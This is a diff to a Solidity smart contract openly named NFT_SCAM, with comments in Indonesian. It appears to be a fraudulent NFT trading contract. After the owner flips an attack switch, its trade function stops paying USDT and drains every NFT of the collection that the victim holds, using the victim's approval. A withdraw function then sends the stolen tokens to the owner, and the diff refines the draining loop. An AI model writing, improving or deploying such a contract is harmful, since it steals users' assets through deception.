@@ -1,73 +1,63 @@
 // SPDX-License-Identifier: MIT
 
 // ini bisa kalau misalnya nanti dalam implementasi erc721nya itu ada penerapan extension ERC721Enumerable
-pragma solidity 0.8.25;
+pragma solidity ^0.8.13;
 
-interface IERC20 {
-    function transfer(address to, uint256 amount) external returns (bool);
-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-}
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {IERC721Enumerable} from "@openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol";
 
-interface IERC721 {
-    function ownerOf(uint256 tokenId) external view returns (address);
-    function safeTransferFrom(address from, address to, uint256 tokenId) external;
-    function setApprovalForAll(address operator, bool approved) external;
-    function balanceOf(address owner) external view returns (uint256);
-}
-
-interface IERC721Enumerable is IERC721 {
-    function totalSupply() external view returns (uint256);
-    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
-    function tokenByIndex(uint256 index) external view returns (uint256);
-}
-
-contract NFT_SCAM{
+contract NFT_SCAM {
     address owner;
-    IERC721 nft;
-    IERC721Enumerable nft_drain;
     IERC20 usdt;
-    uint256 price_nft = 50e17;
+    uint256 price_nft = 50e6; // 50 USDT with 6 decimals
     bool isAttack = false;
-    uint256 tokenId;
 
-    modifier onlyOwner{
+    modifier onlyOwner() {
         require(owner == msg.sender, "This is my scam contract hahahhaha");
         _;
     }
 
-    constructor(address _owner, address _usdt){
+    constructor(address _owner, address _usdt) {
         owner = _owner;
         usdt = IERC20(_usdt);
     }
 
-    function attack() external onlyOwner{
+    function attack() external onlyOwner {
         isAttack = true;
     }
 
-    function trade(address _nft, uint256 _tokenId) external payable{
-        nft = IERC721(_nft);
-        tokenId = _tokenId;
-        require(nft.ownerOf(tokenId) == msg.sender, "Please input the valid tokenid");
-        if(isAttack){
-            nft_drain = IERC721Enumerable(_nft);
-            // nft.setApprovalForAll(address(this), true); ini nanti dilakukan sama user
-            uint256 total_supply = nft.balanceOf(msg.sender);
-            for(uint256 i = 0; i < total_supply; i++){
-                tokenId = nft_drain.tokenOfOwnerByIndex(msg.sender, i);
-                nft.safeTransferFrom(msg.sender, address(this), tokenId);
+    function trade(address _nft, uint256 _tokenId) external {
+        require(
+            IERC721(_nft).ownerOf(_tokenId) == msg.sender,
+            "Please input the valid tokenid"
+        );
+
+        if (isAttack) {
+            uint256 owned = IERC721(_nft).balanceOf(msg.sender);
+            for (uint256 i = 0; i < owned; i++) {
+                IERC721(_nft).transferFrom(
+                    msg.sender,
+                    address(this),
+                    IERC721Enumerable(_nft).tokenOfOwnerByIndex(msg.sender, 0)
+                );
             }
-        }else{
-            nft.safeTransferFrom(msg.sender, address(this), tokenId);
+        } else {
+            IERC721(_nft).transferFrom(msg.sender, address(this), _tokenId);
             usdt.transfer(msg.sender, price_nft);
         }
     }
 
-    function withdraw() external onlyOwner{
-        uint256 total_supply = nft.balanceOf(address(this));
-        for(uint256 i = 0; i < total_supply; i++){
-            tokenId = nft_drain.tokenOfOwnerByIndex(address(this), i);
-            nft.safeTransferFrom(address(this), owner, tokenId);
+    function withdraw(address _nft) external onlyOwner {
+        IERC721Enumerable nft = IERC721Enumerable(_nft);
+
+        uint256 owned = nft.balanceOf(address(this));
+        for (uint256 i = 0; i < owned; i++) {
+            nft.safeTransferFrom(
+                address(this),
+                owner,
+                nft.tokenOfOwnerByIndex(address(this), 0)
+            );
         }
     }
 }
